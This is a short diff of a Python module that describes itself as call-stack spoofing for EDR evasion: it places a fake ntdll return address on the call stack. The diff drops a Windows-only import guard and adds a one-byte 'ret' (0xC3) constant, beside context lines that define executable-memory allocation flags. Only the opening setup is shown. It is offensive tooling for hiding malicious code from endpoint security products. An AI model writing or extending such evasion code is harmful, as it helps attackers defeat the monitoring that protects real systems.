@@ -1,9 +1,9 @@
 """Call stack spoofing — fake ntdll return address on call stack for EDR evasion."""
 import os
-if os.name != 'nt':
-    raise ImportError('Windows-only module')
 import ctypes
 import struct
+
+MAGIC = struct.pack('B', 0xC3)
 MEM = 0x3000  # MEM_COMMIT | MEM_RESERVE
 RWX, NTSTATUS = 0x40, ctypes.c_long
 def _gpa(name):
